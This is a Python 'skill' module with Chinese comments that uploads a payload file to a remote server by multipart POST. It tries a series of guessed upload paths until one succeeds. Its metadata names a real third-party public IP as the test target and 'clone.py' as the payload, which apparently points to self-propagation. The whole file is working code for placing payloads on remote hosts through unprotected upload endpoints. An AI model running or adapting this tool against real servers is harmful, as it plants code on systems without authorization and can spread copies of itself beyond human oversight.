"""skill/deploy_http_post_multipart.py - 使用HTTP POST多部分表单上传payload到远程路径

SKILL_META:
{
  "name": "deploy_http_post_multipart",
  "description": "使用HTTP POST多部分表单上传payload到远程路径",
  "category": "deploy",
  "test_target": "209.51.188.20:80 /pub",
  "test_args": "--host 209.51.188.20 --port 80 --path /pub --payload_file clone.py",
  "version": "4.0"
}
"""
from __future__ import annotations

import argparse
import json
import os
import sys
from typing import Any
import http.client
import mimetypes
from urllib.parse import urlparse

PATH_VARIANTS = ["", "/", "/upload", "/uploads", "/files", "/file", "/data", "/api/upload"]

def build_multipart_body(fields: dict[str, tuple[str, bytes, str]]) -> tuple[bytes, str]:
    """构建 multipart/form-data 请求体"""
    boundary = "----FormBoundary" + "".join(format(i, "02x") for i in os.urandom(8))
    body = b""
    for name, (filename, content, content_type) in fields.items():
        body += f"--{boundary}\r\n".encode()
        body += f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'.encode()
        body += f"Content-Type: {content_type}\r\n\r\n".encode()
        body += content + b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    return body, boundary

def send_request_with_redirect(conn: http.client.HTTPConnection, method: str, path: str, body: bytes, headers: dict, max_redirects: int = 5) -> tuple[int, str, list[str], dict]:
    """发送HTTP请求并跟随重定向"""
    redirect_history = []
    current_path = path
    current_conn = conn

    for _ in range(max_redirects + 1):
        current_conn.request(method, current_path, body, headers)
        response = current_conn.getresponse()
        status = response.status
        response_body = response.read().decode("utf-8", errors="replace")
        response_headers = dict(response.getheaders())

        if status in (301, 302, 303, 307, 308):
            location = response.getheader("Location") or response.getheader("location")
            if location:
                redirect_history.append(f"{status} -> {location}")
                parsed = urlparse(location)
                if parsed.netloc:
                    host_port = parsed.netloc.split(":")
                    new_host, new_port = host_port[0], int(host_port[1]) if len(host_port) > 1 else 80
                    current_conn.close()
                    current_conn = http.client.HTTPConnection(new_host, new_port, timeout=30)
                    current_path = parsed.path or "/"
                else:
                    current_path = parsed.path if parsed.path else "/"
                    if not current_path.startswith("/"):
                        current_path = "/" + current_path
                continue
        return status, response_body, redirect_history, response_headers

    return 508, "Too many redirects", redirect_history, {}

def try_upload_paths(host: str, port: int, base_path: str, filename: str, body: bytes, boundary: str, debug: bool = False) -> dict[str, Any]:
    """尝试多个路径变体上传"""
    headers = {"Content-Type": f"multipart/form-data; boundary={boundary}", "Content-Length": str(len(body))}

    paths_to_try = []
    if not base_path.endswith("/"):
        base_path += "/"

    for suffix in PATH_VARIANTS:
        paths_to_try.append(base_path + filename if suffix == "" else base_path + suffix.lstrip("/") + "/" + filename)

    seen = set()
    unique_paths = []
    for p in paths_to_try:
        if p not in seen:
            seen.add(p)
            unique_paths.append(p)

    results = []

    for path in unique_paths:
        if debug:
            print(f"[DEBUG] Trying path: {path}", file=sys.stderr)

        try:
            conn = http.client.HTTPConnection(host, port, timeout=30)
            response_code, response_body, redirect_history, response_headers = send_request_with_redirect(
                conn, "POST", path, body, headers
            )
            conn.close()

            if debug:
                print(f"[DEBUG] Response {response_code}: {response_body[:100]}", file=sys.stderr)

            results.append({
                "path": path,
                "response_code": response_code,
                "response_body": response_body,
                "redirect_history": redirect_history,
                "response_headers": response_headers
            })

            if 200 <= response_code < 300:
                return {
                    "success": True,
                    "response_code": response_code,
                    "message": response_body[:500] if response_body else "Upload success",
                    "redirect_history": redirect_history,
                    "used_path": path,
                    "all_attempts": results
                }

        except Exception as e:
            if debug:
                print(f"[DEBUG] Error on {path}: {e}", file=sys.stderr)
            results.append({"path": path, "error": str(e)})

    return {
        "success": False,
        "response_code": results[-1].get("response_code", 0) if results else 0,
        "message": "All path variants failed",
        "redirect_history": [],
        "used_path": "",
        "all_attempts": results
    }

def main(host: str = None, port: int = None, path: str = None, payload_file: str = None, debug: bool = False) -> dict[str, Any]:
    """使用HTTP POST多部分表单上传payload到远程路径"""
    result: dict[str, Any] = {"success": False, "response_code": 0, "message": "", "redirect_history": [], "error_detail": {}}

    # 参数解析：如果有参数未提供，则尝试从命令行获取
    if not all([host, port, path, payload_file]):
        parser = argparse.ArgumentParser(description="HTTP POST multipart upload")
        parser.add_argument("--host", required=False, help="Target host IP")
        parser.add_argument("--port", type=int, required=False, help="Target port")
        parser.add_argument("--path", required=False, help="Upload path")
        parser.add_argument("--payload_file", required=False, help="Payload file to upload")
        parser.add_argument("--debug", action="store_true", help="Enable debug output")

        try:
            args, _ = parser.parse_known_args()
            host = host or args.host
            port = port or args.port
            path = path or args.path
            payload_file = payload_file or args.payload_file
            debug = debug or args.debug
        except:
            pass

    if not all([host, port, path, payload_file]):
        result["message"] = "Missing required arguments: host, port, path, payload_file"
        return result

    filename = os.path.basename(payload_file)

    try:
        if not os.path.exists(payload_file):
            result["message"] = f"Payload file not found: {payload_file}"
            return result

        with open(payload_file, "rb") as f:
            file_content = f.read()

        content_type = mimetypes.guess_type(payload_file)[0] or "application/octet-stream"
        fields = {"file": (filename, file_content, content_type)}
        body, boundary = build_multipart_body(fields)

        if debug:
            print(f"[DEBUG] Uploading {filename} ({len(file_content)} bytes) to {host}:{port}", file=sys.stderr)
            print(f"[DEBUG] Content-Type: {content_type}", file=sys.stderr)

        result = try_upload_paths(host, port, path, filename, body, boundary, debug)

        if not result["success"]:
            result["error_detail"] = {
                "status_text": http.client.responses.get(result["response_code"], "Unknown"),
                "attempts_count": len(result.get("all_attempts", []))
            }

    except FileNotFoundError as e:
        result["message"] = f"File error: {e}"
    except ConnectionRefusedError as e:
        result["message"] = f"Connection refused: {e}"
    except TimeoutError as e:
        result["message"] = f"Connection timeout: {e}"
    except OSError as e:
        result["message"] = f"Network error: {e}"
    except Exception as e:
        result["message"] = f"Unexpected error: {e}"

    return result

if __name__ == "__main__":
    result = main()
    print(json.dumps(result, ensure_ascii=False, indent=2))